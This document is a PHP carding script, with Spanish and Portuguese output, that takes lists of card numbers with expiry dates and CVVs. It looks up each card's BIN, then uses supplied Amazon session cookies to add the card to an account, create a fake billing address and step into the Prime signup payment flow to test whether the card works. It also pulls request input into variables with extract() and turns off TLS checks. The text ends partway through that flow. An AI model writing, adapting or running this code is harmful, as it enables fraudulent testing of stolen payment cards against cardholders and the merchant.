<?php
error_reporting(0);
ignore_user_abort();

function getstr($string, $start, $end){

$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];

}

function getstr2($string, $start, $end, $line = 1) {

$str = explode($start, $string);
$str = explode($end, $str[$line]);
return $str[0];

}

function multiexplode($delimiters, $string){

$one = str_replace($delimiters, $delimiters[0], $string);
$two = explode($delimiters[0], $one);
return $two;

}

// Función para obtener los primeros 6 dígitos de la tarjeta (BIN)
function getBin($cc) {
    return substr($cc, 0, 6);
}

//$lista = str_replace(array(" "), '/', $_POST['lista']);
$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){

die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning"></span><br>');
}

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function gerarLetrasAleatorias($quantidade) {
$letras = 'abcdefghijklmnopqrstuvwxyz';
$tamanhoLetras = strlen($letras);
$resultado = '';

for ($i = 0; $i < $quantidade; $i++) {
$indice = rand(0, $tamanhoLetras - 1);
$resultado .= $letras[$indice];
}

return $resultado;
}

$quantidadeLetras = 7; 
$letrasAleatorias = gerarLetrasAleatorias($quantidadeLetras);

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

 $cookieprim = $_GET['cookie1'] ?? '';
$cookie2 = $_GET['cookie2'] ?? '';
$cookie3 = $_GET['cookie3'] ?? '';
$cookie4 = $_GET['cookie4'] ?? '';
$cookies = array_filter([$cookieprim, $cookie2, $cookie3, $cookie4]);
if(count($cookies) == 0){ die('Coloca bien las cookies de amazon.com'); }
session_start();
if(!isset($_SESSION['cookie_index'])){ $_SESSION['cookie_index'] = 0; }
$cookieprim = $cookies[$_SESSION['cookie_index'] % count($cookies)];
$_SESSION['cookie_index']++;

 if($cookieprim == null){

die("Coloca bien las cookies de amazon.com");    
    
}

 $cookieprim = trim($cookieprim);

function convertCookie($text, $outputFormat = 'BR')
{
$countryCodes = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($outputFormat, $countryCodes)) {
return $text;
}

$currentCountry = $countryCodes[$outputFormat];

$text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
$text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
$text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
$text = str_replace('acbuc', $currentCountry['code'], $text);

return $text;
}

$_com_cookie = convertCookie($cookieprim, 'US');
$tries = 3;

///////////////////////////////////////////////////////////////////////////////////////

// $cc ya esta definido
$bin = substr($cc, 0, 6); // Extraer los primeros 6 dígitos (BIN)

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bins.antipublic.cc/bins/" . $bin);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
));
$puxarbins = curl_exec($ch);
curl_close($ch);

// Decodificar la respuesta JSON
$data = json_decode($puxarbins, true);

// Extraer la información necesaria
$pais = $data['country_name'] ?? 'Desconocido';
$bandeira = $data['brand'] ?? 'Desconocido';
$tipo = $data['type'] ?? 'Desconocido';
$nivel = $data['level'] ?? 'Desconocido';
$banco = $data['bank'] ?? 'Desconocido';

// Formatear la información
$INFO = "$bandeira $banco $tipo $nivel ($pais)";
$informacoes = strtoupper(strtolower($INFO));

echo $informacoes;

///////////////////////////////////////////////////////////////////////////////////////

$time = time();
$first_name = "Dulcey";
$last_name = "Guayaba";
$fullnamekk = "$first_name $last_name";

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://www.amazon.com/ax/account/manage?openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account&openid.assoc_handle=usflex&shouldShowPasskeyLink=true&passkeyEligibilityArb=455b1739-065e-4ae1-820a-d72c2583e302&passkeyMetricsActionId=781d7a58-8065-473f-ba7a-f516071c3093',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_COOKIE => $_com_cookie,
    CURLOPT_ENCODING => "gzip",
    CURLOPT_HTTPHEADER => array(
        'Host: www.amazon.com',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With: com.amazon.mShop.android.shopping',
        'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
    ),
]);
$r = curl_exec($ch);

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($r, "Sorry, your passkey isn't working. There might be a problem with the server. Sign in with your password or try your passkey again later.")) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener acceso passkey, entra en "Mi cuenta" y depues "Seguridad" y realiza el login nuevamente. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}else{}

$cookie2 = convertCookie($cookieprim, 'US');

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE => $cookie2,
CURLOPT_ENCODING => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.dee.app',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$csrf = getstr($r, 'csrfToken = "','"');

if ($csrf == null) {
 
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> El Token de seguridad no fue obtenido. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE => $cookie2,
CURLOPT_ENCODING => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22AddPaymentInstr%22%3A%7B%22cc_CardHolderName%22%3A%22'.$first_name.'+'.$last_name.'%22%2C%22cc_ExpirationMonth%22%3A%22'.intval($mes).'%22%2C%22cc_ExpirationYear%22%3A%22'.$ano.'%22%7D%7D%7D&csrfToken='.urlencode($csrf).'&addCreditCardNumber='.$cc.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)
]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$cardid_puro = getstr($r, '"paymentInstrumentId":"','"');

if (strpos($r, 'paymentInstrumentId')) {} else{
die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Cookies no detectadas, entre en mi cuenta y depues seguridad e ingrese su password para que vuelva a funcionar. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');
}

///////////////////////////////////////////////////////////////////////////////////////

function adicionarEnderecoAmazon($cookie2){
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: www.amazon.com',
    'referer: https://www.amazon.com/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);
$getAddressAmazon = curl_exec($curl);
curl_close($curl);

///////////////////////////////////////////////////////////////////////////////////////

$csrftokenaddress = urlencode(getStr($getAddressAmazon, "type='hidden' name='csrfToken' value='","'"));
$addressfromjwt = getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-previous-address-form-state-token" value="','"');
$customeriddkk = getstr($getAddressAmazon, '"customerID":"','"');
$interactionidd = getStr($getAddressAmazon, 'name="address-ui-widgets-address-wizard-interaction-id" value="','"');
$starttimekk = getStr($getAddressAmazon, 'name="address-ui-widgets-form-load-start-time" value="','"');
$requestidd = getStr($getAddressAmazon, '=AddView&hostPageRID=','&' , 1);
$csrftokv2 = urlencode(getStr($getAddressAmazon, 'type="hidden" name="address-ui-widgets-csrfToken" value="','"'));
$randotelefone = rand(1111,9999);

///////////////////////////////////////////////////////////////////////////////////////

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_post',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIE => $cookie2,
  CURLOPT_ENCODING => "gzip",
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'csrfToken='.$csrftokenaddress.'&addressID=&address-ui-widgets-countryCode=US&address-ui-widgets-enterAddressFullName=Dulcey+Guayaba&address-ui-widgets-enterAddressPhoneNumber=3131112121&address-ui-widgets-enterAddressLine1=Travel+General+Delivery&address-ui-widgets-enterAddressLine2=&address-ui-widgets-enterAddressCity=Montgomery&address-ui-widgets-enterAddressStateOrRegion=AL&address-ui-widgets-enterAddressPostalCode=36104&address-ui-widgets-urbanization=&address-ui-widgets-previous-address-form-state-token='.$addressfromjwt.'&address-ui-widgets-use-as-my-default=true&address-ui-widgets-delivery-instructions-desktop-expander-context=%7B%22deliveryInstructionsDisplayMode%22+%3A+%22CDP_ONLY%22%2C+%22deliveryInstructionsClientName%22+%3A+%22YourAccountAddressBook%22%2C+%22deliveryInstructionsDeviceType%22+%3A+%22desktop%22%2C+%22deliveryInstructionsIsEditAddressFlow%22+%3A+%22false%22%7D&address-ui-widgets-addressFormButtonText=save&address-ui-widgets-addressFormHideHeading=true&address-ui-widgets-heading-string-id=&address-ui-widgets-addressFormHideSubmitButton=false&address-ui-widgets-enableAddressDetails=true&address-ui-widgets-returnLegacyAddressID=false&address-ui-widgets-enableDeliveryInstructions=true&address-ui-widgets-enableAddressWizardInlineSuggestions=true&address-ui-widgets-enableEmailAddress=false&address-ui-widgets-enableAddressTips=true&address-ui-widgets-amazonBusinessGroupId=&address-ui-widgets-clientName=YourAccountAddressBook&address-ui-widgets-enableAddressWizardForm=true&address-ui-widgets-delivery-instructions-data=%7B%22initialCountryCode%22%3A%22US%22%7D&address-ui-widgets-ab-delivery-instructions-data=&address-ui-widgets-address-wizard-interaction-id='.$interactionidd.'&address-ui-widgets-obfuscated-customerId='.$customeriddkk.'&address-ui-widgets-locationData=&address-ui-widgets-enableLatestAddressWizardForm=false&address-ui-widgets-avsSuppressSoftblock=false&address-ui-widgets-avsSuppressSuggestion=false&address-ui-widgets-csrfToken='.$csrftokv2.'&address-ui-widgets-form-load-start-time='.$starttimekk.'&address-ui-widgets-clickstream-related-request-id='.$requestidd.'&address-ui-widgets-locale=',
  CURLOPT_HTTPHEADER => [
    'content-type: application/x-www-form-urlencoded',
    'host: www.amazon.com',
    'origin: https://www.amazon.com',
    'referer: https://www.amazon.com/a/addresses/add?ref=ya_address_book_add_button',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'viewport-width: 1536'
  ],
]);

$addAddressValid = curl_exec($curl);
curl_close($curl);

}

///////////////////////////////////////////////////////////////////////////////////////

function obterEnderecoAmazon($cookie2, $csrf) {
    $ch = curl_init(); 
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.amazon.com/hz/mycd/ajax',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE => $cookie2,
        CURLOPT_ENCODING => "gzip",
        CURLOPT_POSTFIELDS => 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' . urlencode($csrf),
        CURLOPT_HTTPHEADER => array(
            'Host: www.amazon.com',
            'Accept: application/json, text/plain, */*',
            'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
            'client: MYXSettings',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.amazon.com',
            'X-Requested-With: com.amazon.dee.app',
            'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
            'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        )
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    
    return getStr($r, 'AddressId":"','"');
}

///////////////////////////////////////////////////////////////////////////////////////

$addresid = obterEnderecoAmazon($cookie2, $csrf);

if (empty($addresid)) {

    adicionarEnderecoAmazon($cookie2);
    sleep(2);
    $addresid = obterEnderecoAmazon($cookie2, $csrf);

    if (empty($addresid)) {
        die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Eh agregado una direccion en tu cuenta, entra a confirmarla e intente nuevamente. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');
    }
}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/hz/mycd/ajax',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'data=%7B%22param%22%3A%7B%22SetOneClickPayment%22%3A%7B%22paymentInstrumentId%22%3A%22'.$cardid_puro.'%22%2C%22billingAddressId%22%3A%22'.$addresid.'%22%2C%22isBankAccount%22%3Afalse%7D%7D%7D&csrfToken='.urlencode($csrf).'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36',
'client: MYXSettings',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://www.amazon.com',
'X-Requested-With: com.amazon.dee.app',
'Referer: https://www.amazon.com/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca',
'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
)

]);
$r = curl_exec($ch);
curl_close($ch);

if(strpos($r, '"success":true,"paymentInstrumentId":"')) {} else {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al agregar la tarjeta de credito. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'X-Requested-With: com.amazon.mShop.android.shopping',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',
)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$market = getstr($r, "ue_mid = '","'");
$wigstst = getStr($r, 'testAjaxAuthenticationRequired":"false","clientId":"YA:Wallet","serializedState":"','"');
$customerId = getStr($r, 'customerId":"','"');
$widgetInstanceId = getStr($r, 'widgetInstanceId":"','"');
$session_id   = getstr($r, '"sessionId":"', '"');

if ($wigstst == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener el widgetState. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init(); 
curl_setopt_array($ch, [
CURLOPT_URL=> 'https://www.amazon.com/payments-portal/data/widgets2/v1/customer/'.$customerId.'/continueWidget',
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS=> 'ppw-jsEnabled=true&ppw-widgetState='.$wigstst.'&ppw-widgetEvent=ViewPaymentMethodDetailsEvent&ppw-instrumentId='.$cardid_puro.'',
CURLOPT_HTTPHEADER => array(
'Host: www.amazon.com',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'Widget-Ajax-Attempt-Count: 0',
'APX-Widget-Info: YA:Wallet/mobile/'.$widgetInstanceId.'',
'User-Agent: Amazon.com/26.22.0.100 (Android/9/SM-G973N)',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_mshop_mpo',
'Accept-Language: pt-BR,pt-PT;q=0.9,pt;q=0.8,en-US;q=0.7,en;q=0.6',

)

]);
$r = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$payment = getStr($r, '"paymentMethodId\":\"','\"');
$cookie2 = convertCookie($cookieprim, 'US');

if ($payment == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al vincular la tarjeta. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$cookieUS1 = 'amazon.com';

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://".$cookieUS1."/gp/prime/pipeline/membersignup",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
// CURLOPT_POSTFIELDS     => "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1",
CURLOPT_POSTFIELDS     => "clientId=DiscoveryBar&ingressId=JoinPrimePill&ref=join_prime_cta_discobar&primeCampaignId=DiscoveryBar_JoinPrimePill_ATVHome&redirectURL=&inline=1&disableCSM=1",
CURLOPT_HTTPHEADER => array(
"Host: $cookieUS1",
"content-type: application/x-www-form-urlencoded",
),
]);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$wid9090 = getstr($result, 'name=&amp;quot;ppw-widgetState&amp;quot; value=&amp;quot;','&amp;quot;');
$sessionds = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;session&amp;quot;:&amp;quot;','&amp;quot');
$customerID = getstr($result, 'quot;customerId&amp;quot;:&amp;quot;','&amp;quot');
$noovotoken = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
$ohtoken1 = getstr($result, 'quot;selectedInstrumentIds&amp;quot;:[&amp;quot;','&amp');
$ohtoken2 = getstr($result, 'Subs:Prime&amp;quot;,&amp;quot;serializedState&amp;quot;:&amp;quot;','&amp;quot;');

if ($ohtoken2 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener widgetState de Amazon Prime. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$brurloa92 = 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $brurloa92);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3AShowPreferencePaymentOptionListEvent%3A%7B%22instrumentId%22%3A%5B%22".$cardid_puro."%22%5D%2C%22instrumentIds%22%3A%5B%22".$cardid_puro."%22%5D%7D=change&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken2."&ie=UTF-8");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/LFqEJMZmYdCd';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://www.'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/confirm';
$headers[] = 'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$ohtoken3 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');
$ohtoken4 = getstr($result, 'data-instrument-id=\"','\"');

if ($ohtoken3 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obter data-instrument-id. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/payments-portal/data/widgets2/v1/customer/'.$customerID.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_POSTFIELDS, "ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=&ppw-jsEnabled=true&ppw-widgetState=".$ohtoken3."&ie=UTF-8&ppw-".$token4."_instrumentOrderTotalBalance=%7B%7D&ppw-instrumentRowSelection=instrumentId%3D".$cardid_puro."%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-".$cardid_puro."_instrumentOrderTotalBalance=%7B%7D");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Apx-Widget-Info: Subs:Prime/desktop/r9R8zQ8Dgh1b';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Origin: https://'.$cookieUS1.'';
$headers[] = 'Referer: https://www.'.$cookieUS1.'/gp/prime/pipeline/membersignup';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

